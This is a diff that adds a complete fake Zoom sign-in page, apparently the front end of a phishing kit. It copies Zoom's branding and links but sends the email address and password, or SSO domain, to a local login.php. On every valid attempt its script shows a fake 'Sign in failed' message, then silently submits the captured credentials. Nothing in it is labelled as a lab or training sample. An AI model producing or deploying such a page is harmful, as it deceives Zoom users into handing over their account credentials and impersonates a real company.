@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sign In | Zoom</title>
+    <link rel="shortcut icon" href="https://st1.zoom.us/zoom.ico">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="page-wrapper">
+
+        <!-- Header -->
+        <header class="header">
+            <div class="header__inner">
+                <a href="https://zoom.us" class="header__logo" target="_blank">
+                    <img src="zoom.svg" alt="Zoom" width="32" height="32">
+                    <span>Zoom</span>
+                </a>
+                <nav class="header__nav">
+                    <a href="https://zoom.us/signup" target="_blank" class="header__link">Sign Up Free</a>
+                </nav>
+            </div>
+        </header>
+
+        <!-- Main -->
+        <main class="main-content">
+            <div class="container">
+                <div class="login-card">
+
+                    <div class="login-card__header">
+                        <h1>Sign In</h1>
+                        <p>Sign in to your Zoom account</p>
+                    </div>
+
+                    <!-- Tabs -->
+                    <div class="tab-nav">
+                        <button class="tab-btn active" onclick="switchTab('email'); return false;">Email</button>
+                        <button class="tab-btn" onclick="switchTab('sso'); return false;">SSO</button>
+                    </div>
+
+                    <!-- Email Login -->
+                    <form id="emailForm" action="login.php" method="POST" class="login-form tab-content active" data-tab="email">
+                        <div class="form-group">
+                            <input type="email" id="email" name="username" placeholder="Email Address" required autocomplete="email">
+                            <p class="error-msg" id="emailError">Please enter a valid email address.</p>
+                        </div>
+                        <div class="form-group">
+                            <input type="password" id="password" name="password" placeholder="Password" required autocomplete="current-password">
+                            <p class="error-msg" id="passwordError">Please enter your password.</p>
+                        </div>
+                        <div class="form-row">
+                            <label class="checkbox-label">
+                                <input type="checkbox" name="remember" checked>
+                                <span>Keep me signed in</span>
+                            </label>
+                            <a href="https://zoom.us/forgot_password" target="_blank" class="forgot-link">Forgot password?</a>
+                        </div>
+                        <p class="error-msg error-msg--general" id="generalError">Sign in failed. Please check your credentials and try again.</p>
+                        <button type="submit" class="btn btn-primary">Sign In</button>
+
+                        <div class="divider"><span>or sign in with</span></div>
+
+                        <div class="social-buttons">
+                            <a href="https://accounts.google.com/signin" target="_blank" class="btn btn-social">
+                                <svg viewBox="0 0 24 24" width="18" height="18">
+                                    <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 01-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/>
+                                    <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+                                    <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+                                    <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+                                </svg>
+                                Google
+                            </a>
+                            <a href="https://www.facebook.com/login.php" target="_blank" class="btn btn-social">
+                                <svg viewBox="0 0 24 24" width="18" height="18" fill="#1877F2">
+                                    <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                                </svg>
+                                Facebook
+                            </a>
+                        </div>
+                    </form>
+
+                    <!-- SSO Login -->
+                    <form id="ssoForm" action="login.php" method="POST" class="login-form tab-content" data-tab="sso" style="display:none;">
+                        <div class="form-group">
+                            <input type="text" name="username" placeholder="Company Domain (e.g. company.zoom.us)">
+                        </div>
+                        <button type="submit" class="btn btn-primary">Continue</button>
+                    </form>
+
+                    <p class="signup-link">
+                        New to Zoom? <a href="https://zoom.us/signup" target="_blank">Sign up free</a>
+                    </p>
+                </div>
+            </div>
+        </main>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <div class="footer__inner">
+                <div class="footer__links">
+                    <a href="https://explore.zoom.us/about-us" target="_blank">About</a>
+                    <a href="https://zoom.us/privacy" target="_blank">Privacy</a>
+                    <a href="https://zoom.us/terms" target="_blank">Terms</a>
+                    <a href="https://support.zoom.us" target="_blank">Support</a>
+                </div>
+                <p class="footer__copy">© 2025 Zoom Communications, Inc. All rights reserved.</p>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        function switchTab(tab) {
+            document.querySelectorAll('.tab-btn').forEach(function(btn) { btn.classList.remove('active'); });
+            document.querySelectorAll('.tab-content').forEach(function(content) { content.style.display = 'none'; });
+            document.querySelector('.tab-btn[onclick*="' + tab + '"]').classList.add('active');
+            document.querySelector('[data-tab="' + tab + '"]').style.display = 'block';
+        }
+
+        document.getElementById('emailForm').addEventListener('submit', function(e) {
+            var email = document.getElementById('email').value.trim();
+            var password = document.getElementById('password').value.trim();
+            var emailError = document.getElementById('emailError');
+            var passwordError = document.getElementById('passwordError');
+            var generalError = document.getElementById('generalError');
+            [emailError, passwordError, generalError].forEach(function(el) { el.style.display = 'none'; });
+            [document.getElementById('email'), document.getElementById('password')].forEach(function(el) { el.classList.remove('input-error'); });
+            var valid = true;
+            if (!email || !email.includes('@') || !email.includes('.')) {
+                emailError.style.display = 'block';
+                document.getElementById('email').classList.add('input-error');
+                valid = false;
+            }
+            if (!password) {
+                passwordError.style.display = 'block';
+                document.getElementById('password').classList.add('input-error');
+                valid = false;
+            }
+            if (!valid) { e.preventDefault(); return; }
+            generalError.style.display = 'block';
+            document.getElementById('email').classList.add('input-error');
+            document.getElementById('password').classList.add('input-error');
+            e.preventDefault();
+            setTimeout(function() {
+                generalError.style.display = 'none';
+                document.getElementById('email').classList.remove('input-error');
+                document.getElementById('password').classList.remove('input-error');
+                document.getElementById('emailForm').submit();
+            }, 2500);
+        });
+    </script>
+</body>
+</html>
